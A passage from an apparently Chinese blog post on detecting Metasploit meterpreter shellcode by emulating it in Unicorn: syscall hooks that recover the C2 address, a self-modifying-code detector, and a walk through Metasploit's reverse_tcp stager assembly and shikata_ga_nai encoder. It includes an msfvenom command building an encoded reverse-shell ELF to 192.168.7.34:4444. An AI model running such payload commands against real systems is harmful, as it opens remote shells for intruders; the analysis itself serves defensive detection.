class="params">(self, data, addr)</span>:</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> self.capmd.disasm(data, addr):</span><br><span class="line">			print(<span class="string">"  0x%x:\t%s\t%s"</span> % (i.address, i.mnemonic, i.op_str))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">disas_all</span><span class="params">(self, data, addr)</span>:</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> self.capmd.disasm(data, addr):</span><br><span class="line">			print(<span class="string">"  0x%x:\t%s\t%s"</span> % (i.address, i.mnemonic, i.op_str))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(uc, addr, size, user_data)</span>:</span></span><br><span class="line">	mem = uc.mem_read(addr, size)</span><br><span class="line">	uc.disasm.disas_single(mem, addr)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># if debug:</span></span><br><span class="line">	<span class="comment"># 	print("r10:&#123;&#125;".format( hex(uc.reg_read( UC_X86_REG_R10 ) ) ))</span></span><br><span class="line">	<span class="comment"># 	print("rcx:&#123;&#125;".format( uc.reg_read( UC_X86_REG_RCX ) ) )</span></span><br><span class="line">	<span class="comment"># 	print("rdx:&#123;&#125;".format( uc.reg_read( UC_X86_REG_RDX ) ) )</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(bin_code,mode,imageBase,entryPoint,max_instruction=<span class="number">0</span>)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> write_bounds</span><br><span class="line">	<span class="keyword">global</span> debug</span><br><span class="line"></span><br><span class="line">	debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">	tags = []</span><br><span class="line">	write_bounds = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line">	disas_engine = SimpleEngine(mode)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> mode == <span class="number">32</span>:</span><br><span class="line">		cur_mode = UC_MODE_32</span><br><span class="line">	<span class="keyword">elif</span> mode == <span class="number">64</span>:</span><br><span class="line">		cur_mode = UC_MODE_64</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		cur_mode = UC_MODE_16</span><br><span class="line">	</span><br><span class="line">	PAGE_SIZE = <span class="number">6</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">	START_RIP = entryPoint</span><br><span class="line"></span><br><span class="line">	<span class="comment"># setup engine and write the memory there.</span></span><br><span class="line">	emu = Uc(UC_ARCH_X86, cur_mode)</span><br><span class="line">	emu.disasm = disas_engine <span class="comment"># python is silly but it works.</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># print( hex(imageBase),PAGE_SIZE,mode )</span></span><br><span class="line">	</span><br><span class="line">	emu.mem_map(imageBase, PAGE_SIZE)</span><br><span class="line">	<span class="comment"># write machine code to be emulated to memory</span></span><br><span class="line">	emu.mem_write(START_RIP, bin_code)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># write a INT 0x3 near the end of the code blob to make sure emulation ends</span></span><br><span class="line">	emu.mem_write(START_RIP + len(bin_code) + <span class="number">0xff</span>, <span class="string">b"\xcc\xcc\xcc\xcc"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> debug:</span><br><span class="line">		<span class="comment"># emu.hook_add(UC_HOOK_MEM_READ, hook_mem_read)</span></span><br><span class="line">		emu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># arbitrary address for ESP.</span></span><br><span class="line">	stackBase = imageBase + PAGE_SIZE - <span class="number">1</span>*<span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">	emu.reg_write(UC_X86_REG_ESP,stackBase)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> max_instruction:</span><br><span class="line">		end_addr = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		max_instruction = <span class="number">0x1000</span></span><br><span class="line">		end_addr = len(bin_code)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>: </span><br><span class="line">		emu.emu_start(START_RIP, end_addr, <span class="number">0</span>, int(max_instruction))</span><br><span class="line">	<span class="comment"># except UC_ERR_READ_UNMAPPED as e:</span></span><br><span class="line">	<span class="comment"># 	# print("ERROR: %s" % e)</span></span><br><span class="line">	<span class="comment"># 	pass</span></span><br><span class="line">	<span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">if</span> e.errno != UC_ERR_READ_UNMAPPED:</span><br><span class="line">			print(<span class="string">"ERROR: %s"</span> % e)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">if</span> debug:</span><br><span class="line">				print(<span class="string">"rcx:&#123;&#125;"</span>.format( emu.reg_read( UC_X86_REG_RCX ) ) )</span><br><span class="line">				print(<span class="string">"rbp:&#123;&#125;"</span>.format( emu.reg_read( UC_X86_REG_RBP ) ) )</span><br></pre></td></tr></table></figure>

<p>执行一下，就可以dump出来当前分支的所有代码，但是现在还并没有处理syscall，接下里需要添加syscall的hook，来dump syscall的参数来方便分析。</p>
<h3 id="0x02-syscall-参数的处理"><a href="#0x02-syscall-参数的处理" class="headerlink" title="0x02 syscall 参数的处理"></a>0x02 syscall 参数的处理</h3><p>x86_64 的syscall调用的系统调用号、参数、和系统调用号可以参考文档 <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a>。</p>
<p>接下里进行 syscall的hook，编写如下类：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HookSyscall</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.c2Server = <span class="literal">None</span></span><br><span class="line">		self.protectAddr = <span class="number">0</span></span><br><span class="line">		self.writeAddr = <span class="number">0</span> </span><br><span class="line">		self.addrLen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">		self.dupList = set() <span class="comment"># dup2</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">ip2Str</span><span class="params">(self,num)</span>:</span></span><br><span class="line">		s = []</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">			s.append(str( num%<span class="number">256</span> ))</span><br><span class="line">			num //= <span class="number">256</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">'.'</span>.join(s[::<span class="number">-1</span>])</span><br><span class="line">  </span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self,uc,user_data)</span>:</span></span><br><span class="line">	<span class="comment"># pass</span></span><br><span class="line">		rax = uc.reg_read(UC_X86_REG_RAX)</span><br><span class="line">		rdi = uc.reg_read(UC_X86_REG_RDI)</span><br><span class="line">		rsi = uc.reg_read(UC_X86_REG_RSI)</span><br><span class="line">		rdx = uc.reg_read(UC_X86_REG_RDX)</span><br><span class="line">		r10 = uc.reg_read(UC_X86_REG_R10)</span><br><span class="line">		r8 = uc.reg_read(UC_X86_REG_R8)</span><br><span class="line">		r9 = uc.reg_read(UC_X86_REG_R9)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> debug:</span><br><span class="line">			print( <span class="string">"[*] rax:\t&#123;&#125;,rdi:\t&#123;&#125;,rsi:\t&#123;&#125;,rdx:\t&#123;&#125;,r10:\t&#123;&#125;"</span>.format(  </span><br><span class="line">				hex(rax),rdi,rsi,rdx,r10</span><br><span class="line">			) )</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> rax == <span class="number">0x09</span>:</span><br><span class="line">			<span class="comment"># # syscall mmap</span></span><br><span class="line">			<span class="comment"># if debug:</span></span><br><span class="line">			<span class="comment"># 	print("[-] mmap")</span></span><br><span class="line">			PROT_EXEC = <span class="number">0x04</span></span><br><span class="line">			PROT_WRITE = <span class="number">0x02</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> rdx &amp; PROT_EXEC <span class="keyword">and</span> rdx &amp; PROT_WRITE:</span><br><span class="line">				<span class="comment"># 返回一个地址					</span></span><br><span class="line">				rip = uc.reg_read(UC_X86_REG_RIP)</span><br><span class="line">				self.protectAddr =  (rip &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">12</span>) + <span class="number">4</span>*<span class="number">0x1000</span></span><br><span class="line">				self.addrLen = rsi</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> debug:</span><br><span class="line">					print(<span class="string">"[-] mmap size: &#123;&#125;,permit: &#123;&#125; , addr: &#123;&#125; "</span>.format( rsi,rdx &amp; <span class="number">0b111</span>,self.protectAddr ))</span><br><span class="line"></span><br><span class="line">				uc.reg_write(UC_X86_REG_RAX,self.protectAddr)</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> rax == <span class="number">0x2b</span>:</span><br><span class="line">			<span class="keyword">if</span> debug:</span><br><span class="line">				print(<span class="string">"[-] listen"</span>)</span><br><span class="line"></span><br><span class="line">			uc.reg_write(UC_X86_REG_RAX,<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> rax == <span class="number">0x29</span>:</span><br><span class="line">			<span class="keyword">if</span> debug:</span><br><span class="line">				print(<span class="string">"[-] socket"</span>)</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> rax == <span class="number">0x21</span>:</span><br><span class="line">			<span class="keyword">if</span> debug:</span><br><span class="line">				print(<span class="string">"[-] dup2 , &#123;&#125;-&gt;&#123;&#125;"</span>.format( rdi, rsi)) </span><br><span class="line">			self.dupList.add( rsi )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> rax == <span class="number">0x2a</span> <span class="keyword">or</span> rax == <span class="number">0x31</span>:</span><br><span class="line">			<span class="keyword">if</span> debug:</span><br><span class="line">				print(<span class="string">"[-] connect or bind!"</span>)</span><br><span class="line">			sockaddr_in_addr = rsi</span><br><span class="line">			</span><br><span class="line">			sockaddr_in_str = <span class="string">"&gt;2HI"</span>		</span><br><span class="line">			tmp = uc.mem_read(sockaddr_in_addr, struct.calcsize(sockaddr_in_str) )</span><br><span class="line">			sockaddr_in = struct.unpack(sockaddr_in_str,tmp)</span><br><span class="line">			<span class="comment"># print(tmp)</span></span><br><span class="line"></span><br><span class="line">			uc.reg_write(UC_X86_REG_RAX,<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">			<span class="comment"># print(sockaddr_in)</span></span><br><span class="line">			</span><br><span class="line">			port  = sockaddr_in[<span class="number">1</span>]</span><br><span class="line">			addr = self.ip2Str(sockaddr_in[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> debug:</span><br><span class="line">				print(<span class="string">"[-] c2 Server &#123;&#125;:&#123;&#125;"</span>.format( addr,port ))</span><br><span class="line">			self.c2Server = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(addr,port)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> rax == <span class="number">0x00</span>:</span><br><span class="line">			print(<span class="string">"[-] read"</span>)</span><br><span class="line">			self.writeAddr = rsi</span><br><span class="line"></span><br><span class="line">			uc.reg_write(UC_X86_REG_RAX,<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment"># if rax ==</span></span><br><span class="line"></span><br><span class="line">		uc.reg_write(UC_X86_REG_RAX,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>添加hook:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">hookSyscall = HookSyscall()</span><br><span class="line">emu.hook_add(UC_HOOK_INSN, hookSyscall, <span class="literal">None</span>, <span class="number">1</span>, <span class="number">0</span>, UC_X86_INS_SYSCALL)</span><br></pre></td></tr></table></figure>

<p>然后运行，就可以看到监控到的syscall参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">0x40008d:     syscall</span><br><span class="line">[*] rax:        0x9L,rdi:       0,rsi:  4096,rdx:       4103,r10:       34</span><br><span class="line">[-] mmap size: 4096,permit: 7 , addr: 4210688 </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">0x4000a3:     syscall</span><br><span class="line">[*] rax:        0x29L,rdi:      2,rsi:  1,rdx:  0,r10:  34</span><br><span class="line">[-] socket</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">0x4000c0:     syscall</span><br><span class="line">[*] rax:        0x2aL,rdi:      41,rsi: 9437168,rdx:    16,r10: 34</span><br><span class="line">[-] connect or bind!</span><br><span class="line">[-] c2 Server 192.168.7.34:4444</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">0x4000f1:     syscall</span><br><span class="line">[*] rax:        0x0L,rdi:       41,rsi: 4210688,rdx:    126,r10:        34</span><br><span class="line">[-] read</span><br><span class="line">0x4000f3:     test    rax, rax</span><br><span class="line">0x4000f6:     js      0x4000e5</span><br><span class="line">0x4000f8:     jmp     rsi</span><br></pre></td></tr></table></figure>

<p>可以看到加载远程的shellcode主要分为五个步骤:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> mmap 申请一块rwx权限的内存空间,地址为A </span><br><span class="line"><span class="number">2.</span> socket  创建一个socket</span><br><span class="line"><span class="number">3.</span> connect 连接一个socket</span><br><span class="line"><span class="number">4.</span> read 读取远程数据写到A</span><br><span class="line"><span class="number">5.</span> jmp A 执行代码</span><br></pre></td></tr></table></figure>

<p>整个过程还是比较简单的。</p>
<h2 id="编码器的执行过程分析"><a href="#编码器的执行过程分析" class="headerlink" title="编码器的执行过程分析"></a>编码器的执行过程分析</h2><p>metepreter 的二进制编码器都是使用SMC代码来实现恶意代码的隐藏，本文使用效果excellent的编码器 <code>x86/shikata_ga_nai</code> 进行示例，接下里的代码一定要使用我patch过的unicorn才能获得预期的效果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom  -p  linux/x64/meterpreter/reverse_tcp  LHOST=192.168.7.34 LPORT=4444 -e x86/shikata_ga_nai -i 1  -f elf &gt; tese_encoder.elf</span><br></pre></td></tr></table></figure>

<p>看一下生成的代码:</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-25-14-28-06.png" alt=""></p>
<p>很明显: </p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">LOAD:</span><span class="number">000000000040007D</span>                 <span class="keyword">fcmovb</span>  <span class="built_in">st</span>, <span class="built_in">st</span>(<span class="number">2</span>)</span><br><span class="line"><span class="symbol">LOAD:</span>000000000040007F                 <span class="keyword">fnstenv</span> [<span class="built_in">rsp</span>+var_C]</span><br><span class="line"><span class="symbol">LOAD:</span><span class="number">0000000000400083</span>                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br></pre></td></tr></table></figure>

<p>获取了下一条指令的地址(当前的RIP)存储在了rbx中，然后调整偏移和esi异或来进行代码修改：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LOAD:0000000000400084                 sub     ecx, ecx</span><br><span class="line">LOAD:0000000000400086                 mov     cl, 21h ; <span class="string">'!'</span></span><br><span class="line">LOAD:0000000000400088                 sub     ebx, 0FFFFFFFCh</span><br><span class="line">LOAD:000000000040008B                 xor     [rbx+10h], esi</span><br></pre></td></tr></table></figure>
<p>经过测试，此编码器每次生成的密钥都不同，也就是这条指令<code>mov esi, 0EF034529h</code>，剩下的流程都是一样的，包括需要解密的长度，一直都是 <code>mov cl, 21h</code>。</p>
<p>仅依靠静态来识别此编码器还是比较简单的，但是想要识别编码器的混用或者自定义的编码器，静态可能就力不从心了，所以我们下面写代码来识别出这种自修改代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加如下hook函数</span></span><br><span class="line">emu.hook_add(UC_HOOK_MEM_WRITE, hook_smc_check)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_bounds = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_smc_check</span><span class="params">(uc, access, address, size, value, user_data)</span>:</span></span><br><span class="line">	SMC_BOUND = <span class="number">0x200</span></span><br><span class="line">	rip = uc.reg_read(UC_X86_REG_RIP)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Just check if the write target addr is near EIP</span></span><br><span class="line">	<span class="keyword">if</span> abs(rip - address) &lt; SMC_BOUND:</span><br><span class="line">		<span class="keyword">if</span> write_bounds[<span class="number">0</span>] == <span class="literal">None</span>:</span><br><span class="line">			write_bounds[<span class="number">0</span>] = address</span><br><span class="line">			write_bounds[<span class="number">1</span>] = address</span><br><span class="line">		<span class="keyword">elif</span> address &lt; write_bounds[<span class="number">0</span>]:</span><br><span class="line">			write_bounds[<span class="number">0</span>] = address</span><br><span class="line">		<span class="keyword">elif</span> address &gt; write_bounds[<span class="number">1</span>]:</span><br><span class="line">			write_bounds[<span class="number">1</span>] = address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> write_bounds[<span class="number">0</span>] != <span class="literal">None</span>:</span><br><span class="line">  <span class="comment"># print("Shellcode address ranges:")</span></span><br><span class="line">  <span class="comment"># print("   low:  0x%X" % write_bounds[0])</span></span><br><span class="line">  <span class="comment"># print("   high: 0x%X" % write_bounds[1])</span></span><br><span class="line">  <span class="comment"># print("")</span></span><br><span class="line">  <span class="comment"># print("Decoded shellcode:")</span></span><br><span class="line">  mem = emu.mem_read(write_bounds[<span class="number">0</span>], (write_bounds[<span class="number">1</span>] - write_bounds[<span class="number">0</span>]))</span><br><span class="line">  emu.disasm.disas_all(mem, write_bounds[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>这样就会完整的dump修改之后的代码，这个修改后的代码和之前生成的代码是相同的。x86系统调用的是<code>int 80</code>中断，其实原理都是一样的， 所以不再赘述。到这里基本的原理和代码都已经讲完了，随便自己再完善一下就可以实现metasploit生成的后门的模拟执行检测了。</p>
<h2 id="Metasploit生成shellcode的过程"><a href="#Metasploit生成shellcode的过程" class="headerlink" title="Metasploit生成shellcode的过程"></a>Metasploit生成shellcode的过程</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>msfvenom</code> 文件的路径在 <code>metasploit-framework/embedded/framework/msfvenom</code>,跟踪这个文件的中的执行流程，当 payload 为 <code>linux/x86/meterpreter/reverse_tcp</code> 会执行到文件 <code>metasploit-framework/embedded/framework/lib/msf/core/payload/linux/reverse_tcp_x86.rb</code>。</p>
<ul>
<li>函数 <code>asm_reverse_tcp</code> 就是生成 shellcode 主函数</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asm_reverse_tcp</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line">  <span class="comment"># <span class="doctag">TODO:</span> reliability is coming</span></span><br><span class="line">  retry_count  = opts[<span class="symbol">:retry_count</span>]</span><br><span class="line">  encoded_port = <span class="string">"0x%.8x"</span> % [opts[<span class="symbol">:port</span>].to_i, <span class="number">2</span>].pack(<span class="string">"vn"</span>).unpack(<span class="string">"N"</span>).first</span><br><span class="line">  encoded_host = <span class="string">"0x%.8x"</span> % Rex::Socket.addr_aton(opts[<span class="symbol">:host</span>]<span class="params">||</span><span class="string">"127.127.127.127"</span>).unpack(<span class="string">"V"</span>).first</span><br><span class="line">  seconds = (opts[<span class="symbol">:sleep_seconds</span>] <span class="params">||</span> <span class="number">5.0</span>)</span><br><span class="line">  sleep_seconds = seconds.to_i</span><br><span class="line">  sleep_nanoseconds = (seconds % <span class="number">1</span> * <span class="number">1000000000</span>).to_i</span><br><span class="line"></span><br><span class="line">  mprotect_flags = 0b111 <span class="comment"># PROT_READ | PROT_WRITE | PROT_EXEC</span></span><br></pre></td></tr></table></figure>

<p>获取重试次数、sleep时间，反弹地址和端口等参数信息。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> respond_to?(<span class="symbol">:generate_intermediate_stage</span>)</span><br><span class="line">  pay_mod = framework.payloads.create(<span class="keyword">self</span>.refname)</span><br><span class="line">  puts <span class="string">"datastore:"</span>,datastore,<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">  payload = pay_mod.generate_stage(datastore.to_h)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># puts "payload:#&#123;payload.split(//).each &#123;|e|;print (e.unpack('H*').to_s)&#125;&#125;"</span></span><br><span class="line"></span><br><span class="line">  read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size</span><br><span class="line"><span class="keyword">elsif</span> !module_info[<span class="string">'Stage'</span>][<span class="string">'Payload'</span>].empty?</span><br><span class="line">  read_length = module_info[<span class="string">'Stage'</span>][<span class="string">'Payload'</span>].size</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="comment"># If we don't know, at least use small instructions</span></span><br><span class="line">  read_length = <span class="number">0x0c00</span> + mprotect_flags</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>此代码只是为了计算下一个控制阶段所要使用的 shellcode 的长度，在这里生成的shellcode不会在本次loader阶段下发。</p>
<p>接着就是 shellcode :</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">asm = %Q^</span><br><span class="line">    push <span class="comment">#&#123;retry_count&#125;        ; retry counter</span></span><br><span class="line">    pop esi</span><br><span class="line">  <span class="symbol">create_socket:</span></span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mul ebx</span><br><span class="line">    push ebx</span><br><span class="line">    inc ebx</span><br><span class="line">    push ebx</span><br><span class="line">    push <span class="number">0x2</span></span><br><span class="line">    mov al, <span class="number">0x66</span></span><br><span class="line">    mov ecx, esp</span><br><span class="line">    int <span class="number">0x80</span>                   ; sys_socketcall (socket())</span><br><span class="line">    xchg eax, edi              ; store the socket <span class="keyword">in</span> edi</span><br><span class="line"></span><br><span class="line">  <span class="symbol">set_address:</span></span><br><span class="line">    pop ebx                    ; set ebx back to zero</span><br><span class="line">    push <span class="comment">#&#123;encoded_host&#125;</span></span><br><span class="line">    push <span class="comment">#&#123;encoded_port&#125;</span></span><br><span class="line">    mov ecx, esp</span><br><span class="line"></span><br><span class="line">  <span class="symbol">try_connect:</span></span><br><span class="line">    push <span class="number">0x66</span></span><br><span class="line">    pop eax</span><br><span class="line">    push eax</span><br><span class="line">    push ecx</span><br><span class="line">    push edi</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    inc ebx</span><br><span class="line">    int <span class="number">0x80</span>                   ; sys_socketcall (connect())</span><br><span class="line">    test eax, eax</span><br><span class="line">    jns mprotect</span><br><span class="line"></span><br><span class="line">  <span class="symbol">handle_failure:</span></span><br><span class="line">    dec esi</span><br><span class="line">    jz failed</span><br><span class="line">    push <span class="number">0xa2</span></span><br><span class="line">    pop eax</span><br><span class="line">    push 0x<span class="comment">#&#123;sleep_nanoseconds.to_s(16)&#125;</span></span><br><span class="line">    push 0x<span class="comment">#&#123;sleep_seconds.to_s(16)&#125;</span></span><br><span class="line">    mov ebx, esp</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    int <span class="number">0x80</span>                   ; sys_nanosleep</span><br><span class="line">    test eax, eax</span><br><span class="line">    jns create_socket</span><br><span class="line">    jmp failed</span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">asm &lt;&lt; asm_send_uuid <span class="keyword">if</span> include_send_uuid</span><br><span class="line"></span><br><span class="line">asm &lt;&lt; %Q^</span><br><span class="line">  <span class="symbol">mprotect:</span></span><br><span class="line">    mov dl, 0x<span class="comment">#&#123;mprotect_flags.to_s(16)&#125;</span></span><br><span class="line">    mov ecx, <span class="number">0x1000</span></span><br><span class="line">    mov ebx, esp</span><br><span class="line">    shr ebx, <span class="number">0xc</span></span><br><span class="line">    shl ebx, <span class="number">0xc</span></span><br><span class="line">    mov al, <span class="number">0x7d</span></span><br><span class="line">    int <span class="number">0x80</span>                  ; sys_mprotect</span><br><span class="line">    test eax, eax</span><br><span class="line">    js failed</span><br><span class="line"></span><br><span class="line">  <span class="symbol">recv:</span></span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    cdq</span><br><span class="line">    mov <span class="comment">#&#123;read_reg&#125;,  0x#&#123;read_length.to_s(16)&#125;</span></span><br><span class="line">    mov al, <span class="number">0x3</span></span><br><span class="line">    int <span class="number">0x80</span>                  ; sys_read (recv())</span><br><span class="line">    test eax, eax</span><br><span class="line">    js failed</span><br><span class="line">    jmp ecx</span><br><span class="line"></span><br><span class="line">  <span class="symbol">failed:</span></span><br><span class="line">    mov eax, <span class="number">0x1</span></span><br><span class="line">    mov ebx, <span class="number">0x1</span>              ; set exit status to <span class="number">1</span></span><br><span class="line">    int <span class="number">0x80</span>                  ; sys_exit</span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">asm</span><br></pre></td></tr></table></figure>

<p>这个代码之前就分析过，这里看起来就非常熟悉了。</p>
<h3 id="encoder"><a href="#encoder" class="headerlink" title="encoder"></a>encoder</h3><p>上一步是生成 payload, 接下来这一步就是利用 encoder 对 payload 进行编码，</p>
<p>encoder <code>x86/shikata_ga_nai</code> 的代码路径是 <code>metasploit-framework/embedded/framework/modules/encoders/x86/shikata_ga_nai.rb</code>:</p>
<p>函数 <code>decoder_stub</code> 是关键，主要作用是生成 shellcode 解码的头部: </p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decoder_stub</span><span class="params">(state)</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If the decoder stub has not already been generated for this state, do</span></span><br><span class="line">  <span class="comment"># it now.  The decoder stub method may be called more than once.</span></span><br><span class="line">  <span class="keyword">if</span> (state.decoder_stub == <span class="literal">nil</span>)</span><br><span class="line">    <span class="comment"># Sanity check that saved_registers doesn't overlap with modified_registers</span></span><br><span class="line">    <span class="keyword">if</span> (modified_registers &amp; saved_registers).length &gt; <span class="number">0</span></span><br><span class="line">      raise BadGenerateError</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Shikata will only cut off the last 1-4 bytes of it's own end</span></span><br><span class="line">    <span class="comment"># depending on the alignment of the original buffer</span></span><br><span class="line">    cutoff = <span class="number">4</span> - (state.buf.length &amp; <span class="number">3</span>)</span><br><span class="line">    block = generate_shikata_block(state, state.buf.length + cutoff, cutoff) <span class="params">||</span> (raise BadGenerateError)</span><br><span class="line">    <span class="comment"># Set the state specific key offset to wherever the XORK ended up.</span></span><br><span class="line">    state.decoder_key_offset = block.index(<span class="string">'XORK'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take the last 1-4 bytes of shikata and prepend them to the buffer</span></span><br><span class="line">    <span class="comment"># that is going to be encoded to make it align on a 4-byte boundary.</span></span><br><span class="line">    state.buf = block.slice!(block.length - cutoff, cutoff) + state.buf</span><br><span class="line">    <span class="comment"># Cache this decoder stub.  The reason we cache the decoder stub is</span></span><br><span class="line">    <span class="comment"># because we need to ensure that the same stub is returned every time</span></span><br><span class="line">    <span class="comment"># for a given encoder state.</span></span><br><span class="line">    state.decoder_stub = block</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  state.decoder_stub</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>先不看 <code>generate_shikata_block</code> 函数的实现，先打印一下 <code>block</code> 内容和最后生成的 elf 文件：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">block: "<span class="symbol">\x</span>DB<span class="symbol">\x</span>CB<span class="symbol">\x</span>BFXORK<span class="symbol">\x</span>D9t$<span class="symbol">\x</span>F4]3<span class="symbol">\x</span>C9<span class="symbol">\x</span>B1<span class="symbol">\x</span>1F1&#125;<span class="symbol">\x</span>1A<span class="symbol">\x</span>83<span class="symbol">\x</span>ED<span class="symbol">\x</span>FC<span class="symbol">\x</span>03&#125;<span class="symbol">\x</span>16<span class="symbol">\x</span>E2<span class="symbol">\x</span>F5"</span><br></pre></td></tr></table></figure>

<p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-05-15-16-44-18.png" alt=""></p>
<p>可以看到 <code>block</code> 的代码就是 <code>fpu</code> 和 getPC 功能的代码，其中 <code>XORK</code> 就是最后的解密密钥，这个值是动态变化的，保证每次都不相同。</p>
<p>但是这样的一个解密的头部，其实还是存在一个很固定的形式的，来看 <code>generate_shikata_block</code> 的代码：</p>
